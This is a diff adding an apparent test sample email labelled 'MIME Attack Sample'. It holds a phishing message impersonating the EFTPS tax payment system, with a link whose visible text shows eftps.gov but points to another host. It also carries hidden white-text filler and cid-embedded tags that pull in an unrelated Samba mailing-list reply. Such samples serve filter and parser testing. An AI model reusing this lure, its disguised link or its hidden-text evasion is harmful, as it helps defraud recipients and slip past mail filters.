@@ -1,0 +1,95 @@
+From: josabank.um.a.12.306@vremail.com
+To: "Hosea" <henna@canola1.uwaterloo.ca>
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/html;
+  charset=windows-1250
+Content-Transfer-Encoding: 7bit
+Content-Length: 2009
+Lines: 34
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 1753
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<HTML><HEAD><TITLE></TITLE>
+</HEAD>
+<BODY>
+
+<STRONG>Your Federal Tax Payment ID: 01037599348 has been 
+    rejected.</STRONG> <BR>
+    Please, check the 
+    information and refer to Code R21 to get details about your company payment in 
+    transaction contacts section: <BR>
+  <A href="http://rvcomfort.com/407lgo/0fllda.html">http://eftps.gov/R21</A> <font color="#FFFFFF">+131. m ii. William Thomas DOROUGH, born 26 Oct 1844, died 11 Jan 1923. 01305781646013474392</font>
+Return Reason Code R21 - The identification number used 
+    in the Company Identification Field is not valid.<BR>
+    In other way forward information to your 
+        accountant adviser. 
+<BR><B>EFTPS: 
+<BR>The Electronic Federal Tax Payment System</B> <BR>
+  <font color="#FFFFFF">Marriage information from "Colonial Georgia Marriage Records from 1760-1810" by 58695266219223441391</font>
+  <BR>
+
+<STRONG>WARNING!<BR></STRONG>You are using an 
+Official United States Government System, which may be used only for authorized 
+purposes. Unauthorized modification of any information stored on this system may 
+result in criminal prosecution. The Government may monitor and audit the usage 
+of this system, and all persons are hereby notified that the use of this system 
+constitutes consent to such monitoring and auditing. Unauthorized attempts to 
+upload information and/or change information on this web site are strictly 
+prohibited and are subject to prosecution under the Computer Fraud and Abuse Act 
+of 1986 and Title 18 U.S.C. Sec. 1001 and 1030.
+
+</FONT><style>06879461977578492554</font>69319653152613147182<font color="#FFFFFF">name spelled Jerome by some descendants, Gerome on early documents which </font><font color="#FFFFFF">79. f iii. Jessie May DORROUGH, born 1820 in Crawford County, Georgia. </font><font color="#FFFFFF">She married Green B. EDMONDSON 30 Jun 1833 in Morgan County, Georgia. He was born about 1802 in </font>
+</DIV>
+
+</BODY></HTML>
+<object width="100%" height="25" data="cid:target"></object>
+<iframe width="100%" height="25"  src="cid:target"></iframe>
+<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
+--DELIMITER
+Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA1
+
+simo wrote:
+> From what I can see translate_upn_username() is used 
+> only to replace real_username in pam_sm_authenticate()
+> But in that function real_username is used only for 
+> debugging purposes. So, why always going through 2
+> winbindd calls (WINBINDD_LOOKUPNAME and WINBINDD_LOOKUPSID)
+> just to have the resolved name in debugging output?
+
+Ahh...Sorry.  Looks like the AIX support in SAMBA_3_0's
+pam_winbind is broken.  So the patch is a bad merge then.
+Assume that real_username is passed to winbind_auth_request().
+I fix the patch.  But the basic means of supporting
+UPN logons stays the same.
+
+
+
+
+
+jerry
+
+
+-BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGhtuOIR7qMdg1EfYRAlZhAKCCMcNU8S9/9M5b6XVYynXTzRxIUwCg73Zq
+OXTcaA5ij3NlCgZugZyGlhI=
+=abt+
+-----END PGP SIGNATURE-----
+
+
+--BOUNDARY--
+--DELIMITER--
